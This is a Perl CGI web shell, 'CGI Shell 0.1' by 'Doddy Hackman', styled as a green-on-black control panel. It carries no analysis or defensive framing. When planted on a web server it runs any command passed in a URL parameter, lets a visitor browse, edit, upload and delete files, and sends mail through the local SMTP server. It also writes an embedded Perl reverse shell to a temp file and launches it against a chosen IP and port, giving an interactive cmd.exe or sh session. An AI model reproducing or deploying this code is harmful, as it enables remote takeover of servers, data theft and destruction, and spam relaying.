#!"\xampp\perl\bin\perl.exe"
#
#CGI Shell 0.1
#
#(C) Doddy Hackman 2011
#
#

use CGI;
use Cwd;
use HTML::Entities;
use Net::SMTP;

my %rta;

my $que = new CGI;
my @ques = $que->param;

for(@ques) {
$rta{$_} = $que->param($_);
}


print "Content-type:text/html\n\n";
print "

<style type=text/css>


.main {
margin			: -287px 0px 0px -490px;
border			: White solid 1px;
BORDER-COLOR: #00FF00;
}


#pie {
position: absolute;
bottom: 0;
}

body,a:link {
background-color: #000000;
color:#00FF00;
Courier New;
cursor:crosshair;
font-size: small;
}

input,table.outset,table.bord,table,textarea,select {
font: normal 10px Verdana, Arial, Helvetica,
sans-serif;
background-color:black;color:#00FF00; 
border: solid 1px #00FF00;
border-color:#00FF00
}

a:link,a:visited,a:active {
color: #00FF00;
font: normal 10px Verdana, Arial, Helvetica,
sans-serif;
text-decoration: none;
}

</style>

<title>CGI Shell (C) Doddy Hackman 2011</title>
<h2><center>CGI Shell</center></h2>

";

if ($rta{'filex'}) {

open FILE ,">>".$rta{'todir'}."/".$rta{'filex'}; 
while($bytes = read($rta{'filex'},$todo, 1024)) {
print FILE $todo;
}
close FILE;

print "<script>alert('File Uploaded');</script>";

}

if ($rta{'codefile'}) {

unlink($rta{'filecode'});

open (FILE,">>".$rta{'filecode'});
print FILE $rta{'codefile'}."\n";
close FILE;

print "<script>alert('File Changed');</script>";

}

if ($rta{'loadfile'}) {
print "<form action='' method=POST>";
print "<br><h2><center>File ".$rta{'loadfile'}."</h2></center><br><br>";

if (-f $rta{'loadfile'}) {

print "<center><textarea name=codefile cols=70 rows=70>";

open (FILE,$rta{'loadfile'});
@words = <FILE>;
close FILE;

for (@words) {
print HTML::Entities::encode($_);
}
print "
</textarea></center>
<input type=hidden name=filecode value=".$rta{'loadfile'}.">
<br><br><center><input type=submit value=Save></center><br><br>
</form>
";

exit(1);
}
}

print "
<br><br>
<b>Console</b>
<br><br>
<fieldset>";


if ($rta{'cmd'}) {
print qx($rta{'cmd'});
}

elsif ($rta{'mail'}) {

my $send = Net::SMTP->new("localhost",Hello => "localhost",Timeout=>10) or die("[-] Error");
$send->mail($rta{'mail'});
$send->to($rta{'to'});   
$send->data(); 
$send->datasend("To:".$rta{'to'}."\n"."From:".$rta{'mail'}."\n"."Subject:".$rta{'subject'}."\n".$rta{'body'}."\n\n"); 
$send->dataend(); 
$send->quit();

}


elsif ($rta{'loadir'}) {

if (-d $rta{'loadir'}) {

opendir DIR,$rta{'loadir'};
my @archivos = readdir DIR;
close DIR;

for(@archivos) {
if (-d $_) {
print "<b>".$_."</b><br>"; 	
} else {
print $_."<br>";
}}}}

elsif (-f $rta{'delfile'}) {
if (unlink($rta{'delfile'})) {
print "<script>alert('File Deleted');</script>";
} else {
print "<script>alert('Error');</script>";
}
}

elsif (-d $rta{'deldir'}) {
if (rmdir($rta{'deldir'})) {
print "<script>alert('Directory Deleted');</script>";
} else {
print "<script>alert('Error');</script>";
}
}

elsif ($rta{'ipconnect'}) {

$code = '
#!usr/bin/perl
#Reverse Shell 0.1
#By Doddy H

use IO::Socket;

print "\n== -- Reverse Shell 0.1 - Doddy H 2010 -- ==\n\n";

unless (@ARGV == 2) { 
print "[Sintax] : $0 <host> <port>\n\n";
exit(1);
} else {
print "[+] Starting the connection\n";
print "[+] Enter in the system\n";
print "[+] Enjoy !!!\n\n";
conectar($ARGV[0],$ARGV[1]);
tipo();
}

sub conectar {
socket(REVERSE, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
connect(REVERSE, sockaddr_in($_[1],inet_aton($_[0])));
open (STDIN,">&REVERSE");
open (STDOUT,">&REVERSE");
open (STDERR,">&REVERSE");
}

sub tipo {
print "\n[*] Reverse Shell Starting...\n\n";
if ($^O =~/Win32/ig) {
infowin();
system("cmd.exe");
} else {
infolinux();
#root();  
system("export TERM=xterm;exec sh -i");
}
}

sub infowin {
print "[+] Domain Name : ".Win32::DomainName()."\n";
print "[+] OS Version : ".Win32::GetOSName()."\n";
print "[+] Username : ".Win32::LoginName()."\n\n\n";
}

sub infolinux {
print "[+] System information\n\n";
system("uname -a");
print "\n\n";
}

#The End
';

if ($^O =~/Win32/ig) { 
open (FILE,">>"."back.pl");
chmod("back.pl","777");
} else {
open (FILE,">>"."/tmp/back.pl");
chmod("/tmp/back.pl","777");
}

print FILE $code;
close FILE;

if ($^O == "MSWin32") { 
system("back.pl ".$rta{'ipconnect'}." ".$rta{'port'});
} else {
system("cd /tmp;back.pl ".$rta{'ipconnect'}." ".$rta{'port'});
}
} else {

opendir DIR,getcwd();
my @archivos = readdir DIR;
close DIR;

for(@archivos) {
if (-d $_) {
print "<b>".$_."</b><br>"; 	
} else {
print $_."<br>";
}}

}

print "</fieldset>
<br><br>
<form action='' method=GET>
<b>Command</b> : <input type=text name=cmd size=100 value=ver><input type=submit value=Send><br>
</form>
<form action='' method=GET>
<B>Load directory</B> : <input type=text size=100 name=loadir value=".getcwd()."><input type=submit value=Load>
</form>
<form action='' method=GET>
<b>Load File</b> : <input type=text size=100 name=loadfile value=".getcwd()."><input type=submit value=Load>
</form>
<form action='' method=GET>
<b>Delete File</b> : <input type=text size=100 name=delfile value=".getcwd()."><input type=submit value=Del>
</form>
<form action='' method=GET>
<b>Delete Directory</b> : <input type=text size=100 name=deldir><input type=submit value=Del>
</form>
<form enctype='multipart/form-data' method=POST>
<br><b>Upload File</b> : <input type=file name=filex><br><br>
<b>To dir</b> : <input type=text name=todir value=".getcwd()."><br><br>
<input type=submit value=Upload>
</form>
<br><B>Mailer</b><br><br>
<form action='' method=GET>
<b>Mail</b> : <input type=text name=mail><br>
<b>To</b> : <input type=text name=to><br>
<b>Subject</B> : <input type=text name=subject><br>
<B>Body</B> : <input type=text name=body><br><br>
<input type=submit value=Send>
</form>
<br><br><b>ReverseShell</b><br><br>
<form action='' method=GET>
<b>IP</B> : <input type=text name=ipconnect><br>
<b>Port</B> : <input type=text name=port><br>
<br><input type=submit value=Connect></form><br><br>

";


# ¿ The End ?